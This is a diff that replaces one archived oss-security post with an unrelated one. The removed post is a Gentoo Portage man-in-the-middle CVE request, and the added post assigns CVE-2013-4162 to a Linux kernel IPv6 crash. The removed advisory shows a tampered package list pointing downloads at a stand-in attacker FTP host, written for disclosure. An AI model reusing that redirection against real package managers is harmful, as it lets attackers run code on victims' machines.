@@ -1,53 +1,61 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/05/15/5
-Message-ID: <CAHmME9rKeh0c1PCGybzR3Vmo8kJnaVUQFDJk45718N3O=UOwvA@mail.gmail.com>
-Date: Wed, 15 May 2013 12:46:57 +0200
-From: "Jason A. Donenfeld" <Jason@...c4.com>
-To: oss-security <oss-security@...ts.openwall.com>
-Cc: Gentoo Security <security@...too.org>, zx2c4@...too.org
-Subject: CVE Request: Man in the middle on Gentoo Portage binary package installer
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/07/23/9
+Message-ID: <51EEDF0A.40707@redhat.com>
+Date: Tue, 23 Jul 2013 13:52:42 -0600
+From: Kurt Seifried <kseifried@...hat.com>
+To: oss-security@...ts.openwall.com
+CC: P J P <ppandit@...hat.com>
+Subject: Re: CVE Request: Linux kernel: panic while pushing pending data out of an IPv6 socket with UDP_CORK enabled.
 Content-Type: text/plain; charset=utf-8
 
-Hi Kurt,
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-Portage is the package manager of Gentoo Linux. It supports many
-features, one of which is the ability to synchronize against a remote
-list of binary packages, and use that list to determine where to fetch
-such binary packages. One of the fields in this list of packages is
-URI:
+On 07/23/2013 01:18 PM, P J P wrote:
+>   Hi,
+> 
+> Linux kernel built with IPv6 networking is vulnerable to a crash while
+> sending data as a single datagram over IPv6 socket when UDP_CORK option
+> set. UDP_CORK enables accumulating data and sending it as a single
+> datagram.
+> 
+> Upstream fix:
+> -------------
+>  -> https://git.kernel.org/linus/8822b64a0fa64a5dd1dfcf837c5b0be83f8c05d1
+> 
+> Reference:
+> ----------
+>  -> https://bugzilla.redhat.com/show_bug.cgi?id=987627
+> 
+> Acknowledgement:
+> -----------------
+> Red Hat would like to thank Hannes Frederic Sowa for reporting this issue.
+> 
+> 
+> Thank you!
+> -- 
+> Prasad J Pandit / Red Hat Security Response Team
+> DB7A 84C5 D3F9 7CD1 B5EB  C939 D048 7860 3655 602B
 
-    victim # curl -s -k https://portage-build.zx2c4.com/Packages | grep URI:
-    URI: ftp://horrible.attacker.somewhere.on.the.internet/blah
+Please use CVE-2013-4162 for this issue.
 
-    victim # emerge -1 portage-utils
-    Calculating dependencies... done!
+- -- 
+Kurt Seifried Red Hat Security Response Team (SRT)
+PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.13 (GNU/Linux)
 
-    >>> Emerging binary (1 of 1) app-portage/portage-utils-0.30 from gentoo
-    --2013-05-15 12:33:32--
-ftp://horrible.attacker.somewhere.on.the.internet/blah/app-portage/portage-utils-0.30.tbz2
-               => ‘/usr/portage/packages/app-portage/portage-utils-0.30.tbz2’
-    Resolving horrible.attacker.somewhere.on.the.internet...
-
-Over insecure connections, Portage provides the ability to use HTTPS
-(in addition to SFTP and SSH), so that this remote list of binary
-packages is not tampered with. This list of binary packages will be
-downloaded in the background silently. Unfortunately, Portage does not
-validate the SSL certificates, leaving this open to a trivial man in
-the middle attack. An attacker could leverage this man in the middle
-vector to remotely gain complete control over a victim's machine,
-since Portage runs with essentially full permissions.
-
-I reported this to the maintainer of Portage in Gentoo Bug #469888
-[1], and it was fixed in commit b5969af9f5 [2].
-
-Do note that while this commit solves the immediate problem with
-fetching /Packages, as detailed above, there may be other additional
-unconfirmed insecure uses of the vulnerable urlopen() function that
-have not yet been analyzed or fixed.
-
-Thanks,
-Jason
-
-
-[1] https://bugs.gentoo.org/show_bug.cgi?id=469888
-[2] http://git.overlays.gentoo.org/gitweb/?p=proj/portage.git;a=commit;h=b5969af9f575e4e4b669f44e76ad01f0dbc2dd27
+iQIcBAEBAgAGBQJR7t8KAAoJEBYNRVNeJnmT8TwQALX0bwqkXpN8vpa7Md0g2E9Z
+oBUEWdolT9QS6TOotOdklbY0AndXZSgLqLzLGsca9cwtQQW5jVpxroPGYmMLBhj1
+Vpju0mTYrnjsd3d6tQN6ORtLW/+oC2F3vvbSdSPu6sg5JkleeDaBBKtFdJl5pgqZ
+cmsQmXtr9ZJc/BJxI5argYcdudvjBHiLrNp6Co3ul27zcR+nZQHBuT/2TBRAnBa2
+fGkOMUtKyJBTOWeROfg2KZ7y5IPdc6h0xR0MOSIRksCRoP9+cQR+qS3myT70s/9A
+baqLzlRiYYO2CC1ewFhqPGnL8+U993pa9hyEPodVbowCyWMwGkQcXsamTlrzFDXh
+AKShbI3WAhLn0tqaojSc9sbYqwgLohZuUdApmGjSDvAV60AG+azZJt1pocSbEJMw
+ASBTQzd4bvS/ec8wpyJdgLEpbleUyPEdjLtY4RgfaWwakoYt9c9hjbv4MUyYPRXX
+BMna1M9aJ/JOeo8NjFRlxVeyBxnVzkZS3MpgbsxgA3GpMYKl1Kx4UDbuBPbHp4YQ
+EVJgusuMxBc6hPZJP3Q3vqXrLD8PhV96czt0GsJttaNG5EUBbA7nl2eW8XTZGDBw
+PSR/jYaqf/2AlVYKHs8fsmWWx06ot3Prz90fXaa5sY6+juOQLHqRgFK6rTWB5GcQ
+qS7Qax34S9wRbDfxlhcH
+=PiVS
+-----END PGP SIGNATURE-----
